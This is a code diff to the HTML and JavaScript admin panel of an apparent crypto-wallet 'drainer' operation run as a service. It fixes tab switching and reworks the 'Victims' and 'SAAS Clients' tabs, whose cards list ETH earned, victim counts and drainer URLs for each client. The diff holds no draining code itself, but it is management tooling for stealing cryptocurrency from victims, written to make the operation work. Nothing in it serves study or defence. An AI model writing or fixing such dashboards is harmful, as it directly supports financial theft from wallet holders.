@@ -30,23 +30,6 @@
         .btn { padding: 5px 10px; border: none; border-radius: 4px; cursor: pointer; font-size: 12px; text-decoration: none; display: inline-block; }
         .btn-primary { background: #007bff; color: white; }
         .btn-success { background: #28a745; color: white; }
-        
-        /* Existing styles */
-        #noDataMsg { font-style: italic; color: #666; }
-        ul#victims { list-style: none; padding: 0; }
-        ul#victims li { 
-            background: #fff; 
-            margin-bottom: 10px; 
-            padding: 15px; 
-            border-radius: 5px; 
-            box-shadow: 0 0 5px rgba(0,0,0,0.1);
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-        .modal { display: none; position: fixed; z-index: 1000; left: 0; top: 0; width: 100%; height: 100%; background-color: rgba(0,0,0,0.5); }
-        .modal-content { background-color: #fff; margin: 5% auto; padding: 20px; border-radius: 10px; width: 80%; max-width: 800px; max-height: 80vh; overflow-y: auto; }
-        .close { color: #aaa; float: right; font-size: 28px; font-weight: bold; cursor: pointer; }
     </style>
 </head>
 <body>
@@ -54,16 +37,16 @@
     
     <!-- Tab Navigation -->
     <div class="tabs">
-        <div class="tab active" onclick="switchTab('victims')">🎯 Victims</div>
-        <div class="tab" onclick="switchTab('saasClients')">🛒 SAAS Clients</div>
-        <div class="tab" onclick="switchTab('analytics')">📊 Analytics</div>
+        <div class="tab active" data-tab="victims">🎯 Victims</div>
+        <div class="tab" data-tab="saasClients">🛒 SAAS Clients</div>
+        <div class="tab" data-tab="analytics">📊 Analytics</div>
     </div>
     
     <!-- SAAS Clients Tab -->
     <div id="saasClients" class="tab-content">
         <h2>🛒 SAAS Clients</h2>
         <div id="clientsContainer">
-            <p id="noClientsMsg">Loading SAAS clients...</p>
+            <p id="noClientsMsg">Click the SAAS Clients tab to load clients.</p>
             <div class="clients-grid" id="clientsGrid" style="display: none;"></div>
         </div>
     </div>
@@ -72,48 +55,45 @@
     <div id="victims" class="tab-content active">
         <h2>🎯 Recent Victims</h2>
         <p id="noDataMsg">No victim data available. Victims will appear here when they interact with your drainers.</p>
-        <ul id="victims"></ul>
+        <ul id="victimsList"></ul>
     </div>
 
     <!-- Analytics Tab -->
     <div id="analytics" class="tab-content">
         <h2>📊 Analytics & Reports</h2>
-        <!-- Existing analytics content will go here -->
         <div id="analyticsContent">
-            <p>Analytics data will be displayed here.</p>
-        </div>
-    </div>
-
-    <!-- Rest of your existing modals and scripts -->
-    <div id="detailsModal" class="modal">
-        <div class="modal-content">
-            <span class="close" onclick="closeModal('detailsModal')">&times;</span>
-            <div id="modalBody"></div>
+            <p>Analytics features coming soon.</p>
         </div>
     </div>
 
     <script>
-        // Tab switching function
+        // Tab switching function - FIXED VERSION
         function switchTab(tabName) {
+            console.log('Switching to tab:', tabName);
+            
             // Remove active class from all tabs and contents
             document.querySelectorAll('.tab').forEach(tab => tab.classList.remove('active'));
             document.querySelectorAll('.tab-content').forEach(content => content.classList.remove('active'));
             
             // Add active class to clicked tab and corresponding content
-            event.target.classList.add('active');
+            document.querySelector('[data-tab="' + tabName + '"]').classList.add('active');
             document.getElementById(tabName).classList.add('active');
             
             // Load data if needed
             if (tabName === 'saasClients') {
                 loadSaaSClients();
+            } else if (tabName === 'victims') {
+                loadVictims();
             }
         }
         
         // Load SAAS clients
         async function loadSaaSClients() {
             try {
+                console.log('Loading SAAS clients...');
                 const response = await fetch('/api/saas-clients');
                 const data = await response.json();
+                console.log('SAAS clients data:', data);
                 
                 if (data.success && data.clients.length > 0) {
                     document.getElementById('noClientsMsg').style.display = 'none';
@@ -124,28 +104,28 @@
                     data.clients.forEach(client => {
                         const card = document.createElement('div');
                         card.className = 'client-card';
-                        card.innerHTML = \`
-                            <h3 style="border-bottom-color: \${client.themeColor}">\${client.projectName}</h3>
+                        card.innerHTML = `
+                            <h3 style="border-bottom-color: ${client.themeColor}">${client.projectName}</h3>
                             <div class="client-info">
-                                <div><strong>ID:</strong> \${client.clientId}</div>
-                                <div><strong>Wallet:</strong> \${client.wallet.substring(0, 8)}...</div>
-                                <div><strong>Registered:</strong> \${client.registrationDate}</div>
+                                <div><strong>ID:</strong> ${client.clientId}</div>
+                                <div><strong>Wallet:</strong> ${client.wallet.substring(0, 8)}...</div>
+                                <div><strong>Registered:</strong> ${client.registrationDate}</div>
                             </div>
                             <div class="client-stats">
                                 <div class="stat">
-                                    <div class="stat-value">\${client.totalEarnings}</div>
+                                    <div class="stat-value">${client.totalEarnings}</div>
                                     <div class="stat-label">ETH Earned</div>
                                 </div>
                                 <div class="stat">
-                                    <div class="stat-value">\${client.victimCount}</div>
+                                    <div class="stat-value">${client.victimCount}</div>
                                     <div class="stat-label">Victims</div>
                                 </div>
                             </div>
                             <div class="client-actions">
-                                <a href="\${client.drainerUrl}" target="_blank" class="btn btn-primary">Drainer URL</a>
-                                <a href="\${client.dashboardUrl}" target="_blank" class="btn btn-success">Dashboard</a>
+                                <a href="${client.drainerUrl}" target="_blank" class="btn btn-primary">Drainer URL</a>
+                                <a href="${client.dashboardUrl}" target="_blank" class="btn btn-success">Dashboard</a>
                             </div>
-                        \`;
+                        `;
                         grid.appendChild(card);
                     });
                 } else {
@@ -157,22 +137,27 @@
             }
         }
         
-        // Your existing modal functions
-        function closeModal(modalId) {
-            document.getElementById(modalId).style.display = 'none';
+        // Load victims (placeholder)
+        function loadVictims() {
+            console.log('Loading victims...');
+            // Your existing victim loading code here
         }
         
-        // Initialize - load victims by default
+        // Initialize - set up tab click handlers
         document.addEventListener('DOMContentLoaded', function() {
-            // Your existing initialization code here
+            console.log('Panel loaded, setting up tabs...');
+            
+            // Add click handlers to all tabs
+            document.querySelectorAll('.tab').forEach(tab => {
+                tab.addEventListener('click', function() {
+                    const tabName = this.getAttribute('data-tab');
+                    switchTab(tabName);
+                });
+            });
+            
+            // Start with victims tab active
             switchTab('victims');
         });
-    </script>
-    
-    <!-- Your existing scripts will continue here -->
-    <script>
-        // Your existing victim loading and analytics scripts
-        // They will still work in their respective tabs
     </script>
 </body>
 </html>
